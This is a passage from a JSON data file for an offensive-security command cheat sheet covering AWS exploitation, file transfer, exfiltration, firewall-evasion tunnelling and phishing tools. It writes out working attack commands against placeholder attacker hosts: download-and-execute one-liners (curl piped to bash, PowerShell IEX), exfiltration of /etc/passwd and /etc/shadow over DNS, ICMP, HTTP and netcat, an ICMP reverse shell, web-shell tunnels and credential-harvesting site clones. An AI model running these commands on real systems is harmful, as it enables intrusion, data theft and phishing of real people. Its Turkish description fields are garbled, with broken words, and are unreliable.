            "desc_tr": "Launch Pacu AWS istismar framework"
          },
          {
            "title": "Pacu — IAM Enum",
            "cmd": "run iam__enum_permissions",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate permissions for the current Pacu session identity",
            "desc_tr": "Listele: permissions for the mevcut Pacu sessiidentity üzerinde"
          },
          {
            "title": "Pacu — Privesc Scan",
            "cmd": "run iam__privesc_scan",
            "tags": [
              "essential"
            ],
            "desc": "Scan for privilege escalation paths in IAM",
            "desc_tr": "Tara: ma for yetki yükseltme paths IAM içinde"
          },
          {
            "title": "Pacu — Enum EC2",
            "cmd": "run ec2__enum",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate EC2 instances and related resources",
            "desc_tr": "Listele: EC2 instances and related resources"
          },
          {
            "title": "Pacu — Enum S3",
            "cmd": "run s3__enum",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate S3 buckets and their permissions",
            "desc_tr": "Listele: S3 buckets and their permissions"
          },
          {
            "title": "Pacu — Enum Lambda",
            "cmd": "run lambda__enum",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate Lambda functions and configurations",
            "desc_tr": "Listele: Lambda functions and configurations"
          },
          {
            "title": "ScoutSuite AWS Audit",
            "cmd": "scout aws --profile <PROFILE_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Run comprehensive AWS security audit with ScoutSuite",
            "desc_tr": "Çalıştır: comprehensive AWS security audit ScoutSuite ile"
          },
          {
            "title": "Prowler AWS Audit",
            "cmd": "prowler aws",
            "tags": [
              "essential"
            ],
            "desc": "Run CIS benchmark and security best practices audit",
            "desc_tr": "Çalıştır: CIS benchmark and security best practices audit"
          },
          {
            "title": "S3Scanner",
            "cmd": "s3scanner scan --bucket-file bucket_names.txt",
            "tags": [
              "tool"
            ],
            "desc": "Scan for misconfigured and public S3 buckets",
            "desc_tr": "Tara: ma for misconfigured and public S3 buckets"
          },
          {
            "title": "CloudMapper Visualization",
            "cmd": "python3 cloudmapper.py collect --config config.json --account <ACCOUNT_NAME> && python3 cloudmapper.py prepare --config config.json --account <ACCOUNT_NAME>",
            "tags": [
              "advanced"
            ],
            "desc": "Collect and visualize AWS network infrastructure",
            "desc_tr": "Topla: and visualize AWS network infrastructure"
          }
        ],
        "name_tr": "Automated Tools"
      }
    ],
    "name_tr": "AWS Bulut Güvenlik Testi",
    "description_tr": "Enumerate and exploit AWS cloud services, IAM, S3, EC2, and more"
  },
  {
    "id": "file-ops",
    "name": "File Transfer Arsenal",
    "icon": "📁",
    "description": "Techniques for transferring files to and from targets across different protocols",
    "subcategories": [
      {
        "name": "Attacker-Side Hosting",
        "commands": [
          {
            "title": "Python3 HTTP Server",
            "cmd": "python3 -m http.server 80",
            "tags": [
              "essential"
            ],
            "desc": "Start a simple HTTP server on port 80",
            "desc_tr": "Başlat: a simple HTTP server port 80 üzerinde"
          },
          {
            "title": "Python2 HTTP Server",
            "cmd": "python -m SimpleHTTPServer 80",
            "tags": [
              "essential"
            ],
            "desc": "Start a Python 2 HTTP server on port 80",
            "desc_tr": "Başlat: a Pyth2 HTTP server on port 80 üzerinde"
          },
          {
            "title": "PHP Built-in Server",
            "cmd": "php -S 0.0.0.0:80",
            "tags": [
              "tool"
            ],
            "desc": "Start a PHP development server for hosting files",
            "desc_tr": "Başlat: a PHP development server for hosting files"
          },
          {
            "title": "Ruby HTTP Server",
            "cmd": "ruby -run -e httpd . -p 80",
            "tags": [
              "tool"
            ],
            "desc": "Start a Ruby HTTP server in the current directory",
            "desc_tr": "Başlat: a Ruby HTTP server the mevcut directory içinde"
          },
          {
            "title": "Busybox HTTP Server",
            "cmd": "busybox httpd -f -p 80",
            "tags": [
              "tool"
            ],
            "desc": "Lightweight HTTP server via busybox",
            "desc_tr": "Lightweight HTTP server busybox üzerinden"
          },
          {
            "title": "Python Upload Server",
            "cmd": "python3 -m uploadserver 443 --server-certificate /path/to/cert.pem",
            "tags": [
              "tool"
            ],
            "desc": "HTTP upload server for receiving files from target",
            "desc_tr": "HTTP upload server for receiving files target üzerinden"
          },
          {
            "title": "Impacket SMB Server (No Auth)",
            "cmd": "impacket-smbserver share $(pwd) -smb2support",
            "tags": [
              "essential"
            ],
            "desc": "Start an SMB server sharing the current directory",
            "desc_tr": "Başlat: an SMB server sharing the mevcut directory"
          },
          {
            "title": "Impacket SMB Server (With Auth)",
            "cmd": "impacket-smbserver share $(pwd) -smb2support -username <USER> -password <PASS>",
            "tags": [
              "essential"
            ],
            "desc": "SMB server with authentication required",
            "desc_tr": "SMB server kimlik doğrulama required ile"
          },
          {
            "title": "FTP Server (pyftpdlib)",
            "cmd": "python3 -m pyftpdlib -p 21 -w",
            "tags": [
              "tool"
            ],
            "desc": "Start a writable FTP server on port 21",
            "desc_tr": "Başlat: a writable FTP server port 21 üzerinde"
          },
          {
            "title": "TFTP Server",
            "cmd": "sudo atftpd --daemon --port 69 /tftp",
            "tags": [
              "tool"
            ],
            "desc": "Start a TFTP server for simple file transfers",
            "desc_tr": "Başlat: a TFTP server for simple file transfers"
          },
          {
            "title": "Netcat Listener (Receive File)",
            "cmd": "nc -lvnp <PORT> > received_file",
            "tags": [
              "essential"
            ],
            "desc": "Listen for incoming file transfer via netcat",
            "desc_tr": "Listen for incoming file transfer netcat üzerinden"
          },
          {
            "title": "Upload Server",
            "desc": "HTTP upload server",
            "cmd": "python3 -m uploadserver 80",
            "tags": [
              "essential"
            ],
            "desc_tr": "HTTP upload server"
          },
          {
            "title": "WebDAV Server",
            "desc": "Host WebDAV",
            "cmd": "wsgidav --host 0.0.0.0 --port 80 --root /tmp/webdav --auth anonymous",
            "tags": [
              "tool"
            ],
            "desc_tr": "Host WebDAV"
          },
          {
            "title": "FTP Server",
            "desc": "Quick FTP server",
            "cmd": "python3 -m pyftpdlib -w -p 21 -u <USER> -P <PASS>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Hızlı FTP server"
          }
        ],
        "name_tr": "Attacker-Side Hosting"
      },
      {
        "name": "Linux Target Downloads",
        "commands": [
          {
            "title": "wget Download",
            "cmd": "wget http://<ATTACKER_IP>/file -O /tmp/file",
            "tags": [
              "essential"
            ],
            "desc": "Download file using wget",
            "desc_tr": "İndir: file wget kullanarak"
          },
          {
            "title": "curl Download",
            "cmd": "curl http://<ATTACKER_IP>/file -o /tmp/file",
            "tags": [
              "essential"
            ],
            "desc": "Download file using curl",
            "desc_tr": "İndir: file curl kullanarak"
          },
          {
            "title": "curl Execute in Memory",
            "cmd": "curl http://<ATTACKER_IP>/script.sh | bash",
            "tags": [
              "essential"
            ],
            "desc": "Download and execute script without writing to disk",
            "desc_tr": "İndir: and execute script writing disk'e olmadan"
          },
          {
            "title": "SCP Download",
            "cmd": "scp <USER>@<ATTACKER_IP>:/path/to/file /tmp/file",
            "tags": [
              "essential"
            ],
            "desc": "Secure copy from attacker machine",
            "desc_tr": "Secure copy attacker machine üzerinden"
          },
          {
            "title": "SCP Upload to Attacker",
            "cmd": "scp /path/to/file <USER>@<ATTACKER_IP>:/tmp/loot/",
            "tags": [
              "essential"
            ],
            "desc": "Upload file from target to attacker",
            "desc_tr": "Yükle: file target attacker üzerinden'e"
          },
          {
            "title": "SFTP Transfer",
            "cmds": [
              "sftp <USER>@<ATTACKER_IP>",
              "get /path/to/file",
              "put /local/file /remote/path/"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Interactive SFTP session for file transfers",
            "desc_tr": "Interactive SFTP sessifor file transfers üzerinde"
          },
          {
            "title": "rsync Transfer",
            "cmd": "rsync -avz <USER>@<ATTACKER_IP>:/path/to/file /tmp/file",
            "tags": [
              "tool"
            ],
            "desc": "Efficient file synchronization via rsync",
            "desc_tr": "Efficient file synchronizatirsync üzerinden üzerinde"
          },
          {
            "title": "Netcat Send File",
            "cmd": "nc <ATTACKER_IP> <PORT> < /path/to/file",
            "tags": [
              "essential"
            ],
            "desc": "Send a file to the attacker via netcat",
            "desc_tr": "Send a file the attacker netcat üzerinden'e"
          },
          {
            "title": "Socat File Transfer",
            "cmd": "socat TCP4:<ATTACKER_IP>:<PORT> file:/tmp/file,create",
            "tags": [
              "tool"
            ],
            "desc": "Download file via socat",
            "desc_tr": "İndir: file socat üzerinden"
          },
          {
            "title": "Bash /dev/tcp Download",
            "cmd": "cat < /dev/tcp/<ATTACKER_IP>/<PORT> > /tmp/file",
            "tags": [
              "advanced"
            ],
            "desc": "Download file using bash built-in /dev/tcp (no external tools)",
            "desc_tr": "İndir: file bash built-/dev/tcp (no external tools) kullanarak içinde"
          },
          {
            "title": "Wget Recursive Download",
            "cmd": "wget -r -np http://<ATTACKER_IP>/share/",
            "tags": [
              "tool"
            ],
            "desc": "Recursively download directory contents",
            "desc_tr": "Recursively download directory contents"
          }
        ],
        "name_tr": "Linux Target Downloads"
      },
      {
        "name": "Windows Target Downloads",
        "commands": [
          {
            "title": "certutil Download",
            "cmd": "certutil -urlcache -split -f http://<ATTACKER_IP>/file.exe C:\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "desc": "Download file via certutil (LOLBin)",
            "desc_tr": "İndir: file certutil (LOLBin) üzerinden"
          },
          {
            "title": "PowerShell DownloadFile",
            "cmd": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file.exe','C:\\Temp\\file.exe')\"",
            "tags": [
              "essential"
            ],
            "desc": "Download file via .NET WebClient",
            "desc_tr": "İndir: file .NET WebClient üzerinden"
          },
          {
            "title": "PowerShell Invoke-WebRequest",
            "cmd": "powershell -c \"Invoke-WebRequest -Uri http://<ATTACKER_IP>/file.exe -OutFile C:\\Temp\\file.exe\"",
            "tags": [
              "essential"
            ],
            "desc": "Download file via Invoke-WebRequest (IWR)",
            "desc_tr": "İndir: file Invoke-WebRequest (IWR) üzerinden"
          },
          {
            "title": "PowerShell IEX (In-Memory)",
            "cmd": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')\"",
            "tags": [
              "essential"
            ],
            "desc": "Download and execute PowerShell script in memory",
            "desc_tr": "İndir: and execute PowerShell script memory içinde"
          },
          {
            "title": "BitsAdmin Download",
            "cmd": "bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>/file.exe C:\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "desc": "Download file via BITS service",
            "desc_tr": "İndir: file BITS service üzerinden"
          },
          {
            "title": "Start-BitsTransfer",
            "cmd": "powershell -c \"Start-BitsTransfer -Source http://<ATTACKER_IP>/file.exe -Destination C:\\Temp\\file.exe\"",
            "tags": [
              "tool"
            ],
            "desc": "Download file via PowerShell BITS cmdlet",
            "desc_tr": "İndir: file PowerShell BITS cmdlet üzerinden"
          },
          {
            "title": "Copy from SMB Share",
            "cmd": "copy \\\\<ATTACKER_IP>\\share\\file.exe C:\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "desc": "Copy file from attacker's SMB share",
            "desc_tr": "Kopyala: file attacker's SMB share üzerinden"
          },
          {
            "title": "Net Use SMB Mount",
            "cmds": [
              "net use Z: \\\\<ATTACKER_IP>\\share /user:<USER> <PASS>",
              "copy Z:\\file.exe C:\\Temp\\file.exe",
              "net use Z: /delete"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Mount SMB share, copy file, and clean up",
            "desc_tr": "Bağla: SMB share, copy file, and clean up"
          },
          {
            "title": "PowerShell Upload (POST)",
            "cmd": "powershell -c \"Invoke-WebRequest -Uri http://<ATTACKER_IP>/upload -Method POST -InFile C:\\Temp\\file.txt\"",
            "tags": [
              "tool"
            ],
            "desc": "Upload file from target to attacker via HTTP POST",
            "desc_tr": "Yükle: file target attacker HTTP POST üzerinden üzerinden'e"
          },
          {
            "title": "Expand CAB File Transfer",
            "cmd": "expand \\\\<ATTACKER_IP>\\share\\file.cab C:\\Temp\\file.exe",
            "tags": [
              "advanced"
            ],
            "desc": "Use expand.exe to copy from remote share (LOLBin)",
            "desc_tr": "Use expand.exe copy uzak share (LOLBin) üzerinden'e"
          },
          {
            "title": "Esentutl Copy",
            "cmd": "esentutl.exe /y \\\\<ATTACKER_IP>\\share\\file.exe /d C:\\Temp\\file.exe /o",
            "tags": [
              "advanced"
            ],
            "desc": "Use esentutl.exe for file copy (LOLBin)",
            "desc_tr": "Use esentutl.exe for file copy (LOLBin)"
          },
          {
            "title": "MakeCab + Expand",
            "cmds": [
              "makecab C:\\Temp\\secret.txt C:\\Temp\\secret.cab",
              "# Transfer secret.cab to attacker",
              "expand secret.cab secret.txt"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Compress and transfer via CAB archive",
            "desc_tr": "Compress and transfer CAB archive üzerinden"
          },
          {
            "title": "Certutil Base64 Encode",
            "cmds": [
              "certutil -encode C:\\Temp\\file.exe C:\\Temp\\file.b64",
              "type C:\\Temp\\file.b64",
              "# On attacker: decode the base64"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Encode file as base64 for text-based exfil (LOLBin)",
            "desc_tr": "Kodla: a file as base64 for text-based exfil (LOLBin)"
          }
        ],
        "name_tr": "Windows Target Downloads"
      },
      {
        "name": "Exfiltration Techniques",
        "commands": [
          {
            "title": "Exfil via DNS (base64 chunks)",
            "cmd": "cat /etc/passwd | base64 -w0 | fold -w 60 | while read line; do nslookup $line.<ATTACKER_DOMAIN>; done",
            "tags": [
              "advanced"
            ],
            "desc": "Exfiltrate data through DNS queries",
            "desc_tr": "Exfiltrate data DNS queries üzerinden"
          },
          {
            "title": "Exfil via ICMP",
            "cmd": "cat /etc/passwd | xxd -p -c 16 | while read line; do ping -c 1 -p $line <ATTACKER_IP>; done",
            "tags": [
              "advanced"
            ],
            "desc": "Exfiltrate data embedded in ICMP packets",
            "desc_tr": "Exfiltrate data embedded ICMP packets içinde"
          },
          {
            "title": "Exfil via curl POST",
            "cmd": "curl -X POST -d @/etc/shadow http://<ATTACKER_IP>:<PORT>/exfil",
            "tags": [
              "tool"
            ],
            "desc": "Exfiltrate file contents via HTTP POST",
            "desc_tr": "Exfiltrate file contents HTTP POST üzerinden"
          },
          {
            "title": "Exfil via Netcat",
            "cmd": "tar czf - /path/to/data/ | nc <ATTACKER_IP> <PORT>",
            "tags": [
              "essential"
            ],
            "desc": "Compress and exfiltrate directory via netcat",
            "desc_tr": "Compress and exfiltrate directory netcat üzerinden"
          },
          {
            "title": "Exfil via OpenSSL Encrypted",
            "cmds": [
              "tar czf - /path/to/data/ | openssl enc -aes-256-cbc -pbkdf2 -pass pass:<PASSWORD> | nc <ATTACKER_IP> <PORT>",
              "# On attacker: nc -lvnp <PORT> | openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:<PASSWORD> | tar xzf -"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Encrypted exfiltration via OpenSSL and netcat",
            "desc_tr": "Encrypted exfiltratiOpenSSL and netcat üzerinden üzerinde"
          }
        ],
        "name_tr": "Exfiltration Techniques"
      },
      {
        "name": "Encoding & Steganography Transfers",
        "commands": [
          {
            "title": "Base64 Encode (Linux)",
            "cmd": "base64 -w0 file.bin > file.b64",
            "tags": [
              "essential"
            ],
            "desc": "Encode a file to base64 for text-based transfer",
            "desc_tr": "Kodla: a a file base64 for text-based transfer'e"
          },
          {
            "title": "Base64 Decode (Linux)",
            "cmd": "base64 -d file.b64 > file.bin",
            "tags": [
              "essential"
            ],
            "desc": "Decode a base64 encoded file",
            "desc_tr": "Çöz: zme a base64 encoded file"
          },
          {
            "title": "Base64 Encode (PowerShell)",
            "cmd": "powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Temp\\file.exe'))\"",
            "tags": [
              "essential"
            ],
            "desc": "Base64 encode a file on Windows",
            "desc_tr": "Base64 kodlama a file Windows üzerinde"
          },
          {
            "title": "Base64 Decode (PowerShell)",
            "cmd": "powershell -c \"[IO.File]::WriteAllBytes('C:\\Temp\\file.exe',[Convert]::FromBase64String('<BASE64_STRING>'))\"",
            "tags": [
              "essential"
            ],
            "desc": "Base64 decode and write file on Windows",
            "desc_tr": "Base64 kod çözme and write file Windows üzerinde"
          },
          {
            "title": "xxd Hex Encode",
            "cmd": "xxd -p file.bin > file.hex",
            "tags": [
              "tool"
            ],
            "desc": "Convert file to hex representation for transfer",
            "desc_tr": "Dönüştür: file hex representatifor transfer üzerinde'e"
          },
          {
            "title": "xxd Hex Decode",
            "cmd": "xxd -r -p file.hex > file.bin",
            "tags": [
              "tool"
            ],
            "desc": "Reconstruct file from hex dump",
            "desc_tr": "Reconstruct file hex dump üzerinden"
          },
          {
            "title": "Steghide Embed Data",
            "cmd": "steghide embed -cf cover_image.jpg -ef secret.txt -p <PASSWORD>",
            "tags": [
              "advanced"
            ],
            "desc": "Hide a file inside an image using steganography",
            "desc_tr": "Hide a file inside an image steganography kullanarak"
          },
          {
            "title": "Steghide Extract Data",
            "cmd": "steghide extract -sf stego_image.jpg -p <PASSWORD>",
            "tags": [
              "advanced"
            ],
            "desc": "Extract hidden data from a steganographic image",
            "desc_tr": "Çıkart: gizli data a steganographic image üzerinden"
          },
          {
            "title": "Exiftool Embed in Metadata",
            "cmd": "exiftool -Comment='<DATA>' image.jpg",
            "tags": [
              "advanced"
            ],
            "desc": "Embed data in image EXIF metadata",
            "desc_tr": "Embed data image EXIF metadata içinde"
          },
          {
            "title": "Exiftool Read Metadata",
            "cmd": "exiftool image.jpg",
            "tags": [
              "tool"
            ],
            "desc": "Read all metadata from a file",
            "desc_tr": "Oku: tüm metadata a file üzerinden"
          }
        ],
        "name_tr": "Encoding & Steganography Transfers"
      }
    ],
    "name_tr": "Dosya Transfer Cephaneliği",
    "description_tr": "Techniques for transferring files to and from targets across different protocols"
  },
  {
    "id": "dpi-evasion",
    "name": "Protocol Tunneling & Firewall Evasion",
    "icon": "🔐",
    "description": "Bypass firewalls and deep packet inspection using protocol tunneling techniques",
    "subcategories": [
      {
        "name": "HTTP/HTTPS Tunneling",
        "commands": [
          {
            "title": "Chisel Server (Attacker)",
            "cmd": "chisel server --reverse --port 8080",
            "tags": [
              "essential"
            ],
            "desc": "Start Chisel server in reverse mode for client connections",
            "desc_tr": "Başlat: Chisel server reverse mode for client connections içinde"
          },
          {
            "title": "Chisel Client Reverse SOCKS",
            "cmd": "chisel client <ATTACKER_IP>:8080 R:socks",
            "tags": [
              "essential"
            ],
            "desc": "Create reverse SOCKS5 proxy through Chisel",
            "desc_tr": "Oluştur: reverse SOCKS5 vekil sunucu (proxy) Chisel üzerinden"
          },
          {
            "title": "Chisel Client Reverse Port Forward",
            "cmd": "chisel client <ATTACKER_IP>:8080 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>",
            "tags": [
              "essential"
            ],
            "desc": "Reverse port forward a specific service through Chisel",
            "desc_tr": "Reverse port forward a belirli service Chisel üzerinden"
          },
          {
            "title": "Chisel Client Forward SOCKS",
            "cmd": "chisel client <ATTACKER_IP>:8080 socks",
            "tags": [
              "tool"
            ],
            "desc": "Create forward SOCKS proxy through Chisel",
            "desc_tr": "Oluştur: forward SOCKS vekil sunucu (proxy) Chisel üzerinden"
          },
          {
            "title": "Chisel Client (HTTPS)",
            "cmd": "chisel client --tls-skip-verify https://<ATTACKER_IP>:8443 R:socks",
            "tags": [
              "advanced"
            ],
            "desc": "Tunnel Chisel through HTTPS to evade DPI",
            "desc_tr": "Tunnel Chisel HTTPS evade DPI'e üzerinden"
          },
          {
            "title": "HTTPTunnel Server (Attacker)",
            "cmd": "hts -F 127.0.0.1:<LOCAL_PORT> <LISTEN_PORT>",
            "tags": [
              "tool"
            ],
            "desc": "Start HTTPTunnel server forwarding to a local service",
            "desc_tr": "Başlat: HTTPTunnel server forwarding a yerel service'e"
          },
          {
            "title": "HTTPTunnel Client (Target)",
            "cmd": "htc -F <LOCAL_PORT> <ATTACKER_IP>:<LISTEN_PORT>",
            "tags": [
              "tool"
            ],
            "desc": "Connect through HTTPTunnel from target",
            "desc_tr": "Bağlan: HTTPTunnel target üzerinden üzerinden"
          },
          {
            "title": "Neo-reGeorg Generate Tunnel",
            "cmd": "python3 neoreg.py generate -k <PASSWORD>",
            "tags": [
              "advanced"
            ],
            "desc": "Generate web shell tunnel files for various languages",
            "desc_tr": "Oluştur: web kabuğu tunnel files for various languages"
          },
          {
            "title": "Neo-reGeorg Connect",
            "cmd": "python3 neoreg.py -k <PASSWORD> -u http://<TARGET_IP>/tunnel.php",
            "tags": [
              "advanced"
            ],
            "desc": "Connect to deployed Neo-reGeorg web tunnel",
            "desc_tr": "Bağlan: deployed Neo-reGeorg web tunnel'e"
          },
          {
            "title": "Tunna Setup",
            "cmds": [
              "# Upload conn.aspx/conn.php to target web server",
              "python2 proxy.py -u http://<TARGET_IP>/conn.php -l <LOCAL_PORT> -r <REMOTE_PORT> -a <TARGET_INTERNAL_IP>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "HTTP tunnel via deployed web shell for port forwarding",
            "desc_tr": "HTTP tunnel deployed web kabuğu for port forwarding üzerinden"
          },
          {
            "title": "ABPTTS Tunnel",
            "cmds": [
              "python2 abpttsfactory.py -o webshell",
              "# Upload generated webshell to target",
              "python2 abpttsclient.py -c config.txt -u http://<TARGET_IP>/abptts.aspx -f 127.0.0.1:<LOCAL_PORT>/<TARGET_INTERNAL_IP>:<REMOTE_PORT>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "TCP tunneling over HTTP using ABPTTS",
            "desc_tr": "TCP tunneling over HTTP ABPTTS kullanarak"
          }
        ],
        "name_tr": "HTTP/HTTPS Tunneling"
      },
      {
        "name": "DNS Tunneling",
        "commands": [
          {
            "title": "dnscat2 Server",
            "cmd": "ruby dnscat2.rb <ATTACKER_DOMAIN> --secret=<SECRET>",
            "tags": [
              "essential"
            ],
            "desc": "Start dnscat2 C2 server listening for DNS queries",
            "desc_tr": "Başlat: dnscat2 C2 server listening for DNS queries"
          },
          {
            "title": "dnscat2 Client",
            "cmd": "dnscat --secret=<SECRET> <ATTACKER_DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Connect to dnscat2 server from target via DNS",
            "desc_tr": "Bağlan: dnscat2 server target DNS üzerinden üzerinden'e"
          },
          {
            "title": "dnscat2 PowerShell Client",
            "cmd": "Start-Dnscat2 -Domain <ATTACKER_DOMAIN> -PreSharedSecret <SECRET>",
            "tags": [
              "tool"
            ],
            "desc": "Connect to dnscat2 from Windows via PowerShell",
            "desc_tr": "Bağlan: dnscat2 Windows PowerShell üzerinden üzerinden'e"
          },
          {
            "title": "Iodine Server",
            "cmd": "sudo iodined -f -c -P <PASSWORD> 10.0.0.1/24 <TUNNEL_DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Start iodine DNS tunnel server with virtual IP range",
            "desc_tr": "Başlat: iodine DNS tunnel server virtual IP range ile"
          },
          {
            "title": "Iodine Client",
            "cmd": "sudo iodine -f -P <PASSWORD> <TUNNEL_DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Connect to iodine DNS tunnel from target",
            "desc_tr": "Bağlan: iodine DNS tunnel target üzerinden'e"
          },
          {
            "title": "dns2tcp Server",
            "cmd": "dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf",
            "tags": [
              "tool"
            ],
            "desc": "Start dns2tcp daemon for DNS tunneling",
            "desc_tr": "Başlat: dns2tcp daemfor DNS tunneling üzerinde"
          },
          {
            "title": "dns2tcp Client",
            "cmd": "dns2tcpc -r ssh -z <ATTACKER_DOMAIN> <DNS_SERVER> -l <LOCAL_PORT>",
            "tags": [
              "tool"
            ],
            "desc": "Connect to dns2tcp and forward SSH through DNS",
            "desc_tr": "Bağlan: dns2tcp and forward SSH DNS'e üzerinden"
          }
        ],
        "name_tr": "DNS Tunneling"
      },
      {
        "name": "ICMP Tunneling",
        "commands": [
          {
            "title": "icmpsh Server (Attacker)",
            "cmds": [
              "sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1",
              "python3 icmpsh_m.py <ATTACKER_IP> <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Start ICMP shell listener (disable kernel ICMP replies first)",
            "desc_tr": "Başlat: ICMP shell listener (disable kernel ICMP replies first)"
          },
          {
            "title": "icmpsh Client (Windows Target)",
            "cmd": "icmpsh.exe -t <ATTACKER_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Connect ICMP reverse shell from Windows target",
            "desc_tr": "Bağlan: ICMP ters bağlantı kabuğu Windows target üzerinden"
          },
          {
            "title": "ptunnel-ng Server",
            "cmd": "sudo ptunnel-ng -r<ATTACKER_IP> -R22",
            "tags": [
              "essential"
            ],
            "desc": "Start ICMP tunnel server forwarding to SSH",
            "desc_tr": "Başlat: ICMP tunnel server forwarding SSH'e"
          },
          {
            "title": "ptunnel-ng Client",
            "cmd": "sudo ptunnel-ng -p<ATTACKER_IP> -l<LOCAL_PORT> -r<TARGET_IP> -R<REMOTE_PORT>",
            "tags": [
              "essential"
            ],
            "desc": "Connect through ICMP tunnel to reach remote service",
            "desc_tr": "Bağlan: ICMP tunnel reach uzak service'e üzerinden"
          },
          {
            "title": "Nping ICMP Data Exfil",
            "cmd": "nping --icmp -c 1 --data-string '<DATA>' <ATTACKER_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Embed data in ICMP packets via nping",
            "desc_tr": "Embed data ICMP packets nping üzerinden içinde"
          }
        ],
        "name_tr": "ICMP Tunneling"
      },
      {
        "name": "Deep Packet Inspection Bypass",
        "commands": [
          {
            "title": "stunnel Client Config",
            "cmds": [
              "# stunnel.conf:",
              "# [tunnel]",
              "# client = yes",
              "# accept = 127.0.0.1:<LOCAL_PORT>",
              "# connect = <ATTACKER_IP>:<REMOTE_PORT>",
              "stunnel /etc/stunnel/stunnel.conf"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Wrap arbitrary TCP traffic in SSL using stunnel",
            "desc_tr": "Wrap arbitrary TCP traffic SSL stunnel kullanarak içinde"
          },
          {
            "title": "OpenSSL as Encrypted Tunnel",
            "cmds": [
              "# On attacker (server):",
              "openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>",
              "# On target (client):",
              "openssl s_client -quiet -connect <ATTACKER_IP>:<PORT>"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Create an encrypted communication channel via OpenSSL",
            "desc_tr": "Oluştur: an encrypted communicatichannel OpenSSL üzerinden üzerinde"
          },
          {
            "title": "Socat SSL Tunnel (Server)",
            "cmd": "socat OPENSSL-LISTEN:<PORT>,cert=server.pem,cafile=client.crt,reuseaddr,fork TCP4:127.0.0.1:<LOCAL_PORT>",
            "tags": [
              "advanced"
            ],
            "desc": "Create an SSL listener that forwards to a local service",
            "desc_tr": "Oluştur: an SSL listener that forwards a yerel service'e"
          },
          {
            "title": "Socat SSL Tunnel (Client)",
            "cmd": "socat TCP4-LISTEN:<LOCAL_PORT>,reuseaddr,fork OPENSSL:<ATTACKER_IP>:<PORT>,cert=client.pem,cafile=server.crt",
            "tags": [
              "advanced"
            ],
            "desc": "Connect to a socat SSL tunnel and expose locally",
            "desc_tr": "Bağlan: a socat SSL tunnel and expose locally'e"
          },
          {
            "title": "SSH Over HTTP (corkscrew)",
            "cmd": "ssh -o ProxyCommand='corkscrew <PROXY_IP> <PROXY_PORT> %h %p' <USER>@<ATTACKER_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Tunnel SSH through an HTTP proxy using corkscrew",
            "desc_tr": "Tunnel SSH an HTTP vekil sunucu (proxy) corkscrew kullanarak üzerinden"
          },
          {
            "title": "SSH Dynamic SOCKS (DPI Evasion)",
            "cmd": "ssh -D 1080 -o 'ProxyCommand=openssl s_client -quiet -connect <ATTACKER_IP>:443' <USER>@127.0.0.1",
            "tags": [
              "advanced"
            ],
            "desc": "Dynamic SOCKS proxy over SSL-wrapped SSH to evade DPI",
            "desc_tr": "Dynamic SOCKS vekil sunucu (proxy) over SSL-wrapped SSH evade DPI'e"
          }
        ],
        "name_tr": "Deep Packet Inspection Bypass"
      }
    ],
    "name_tr": "Protokol Tünelleme ve Güvenlik Duvarı Atlatma",
    "description_tr": "Bypass firewalls and deep packet inspection using protocol tunneling techniques"
  },
  {
    "id": "social-eng",
    "name": "Social Engineering & Phishing",
    "icon": "🎣",
    "description": "Phishing infrastructure, credential harvesting, and social engineering tools",
    "subcategories": [
      {
        "name": "Phishing Infrastructure",
        "commands": [
          {
            "title": "GoPhish Launch",
            "cmd": "sudo ./gophish",
            "tags": [
              "essential"
            ],
            "desc": "Start GoPhish phishing framework (default admin: https://127.0.0.1:3333)",
            "desc_tr": "Başlat: GoPhish phishing framework (default admin: https://127.0.0.1:3333)"
          },
          {
            "title": "SET (Social Engineering Toolkit)",
            "cmd": "sudo setoolkit",
            "tags": [
              "essential"
            ],
            "desc": "Launch the Social Engineering Toolkit interactive menu",
            "desc_tr": "Launch the Social Engineering Toolkit interactive menu"
          },
          {
            "title": "SET Website Clone + Credential Harvest",
            "cmds": [
              "# In setoolkit:",
              "# 1) Social-Engineering Attacks",
              "# 2) Website Attack Vectors",
              "# 3) Credential Harvester Attack Method",
              "# 2) Site Cloner",
              "# Enter your IP and target URL"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Clone a website and capture submitted credentials",
            "desc_tr": "Clone a website and capture submitted kimlik bilgileri"
          },
          {
            "title": "King Phisher Server",
            "cmd": "sudo king-phisher-server -L INFO",
            "tags": [
              "tool"
            ],
            "desc": "Start King Phisher phishing campaign server",
            "desc_tr": "Başlat: King Phisher phishing campaign server"
          },
          {
            "title": "Evilginx2 Launch",
            "cmd": "sudo evilginx2 -p /path/to/phishlets",
            "tags": [
              "essential"
            ],
            "desc": "Start Evilginx2 reverse proxy for session hijacking phishing",
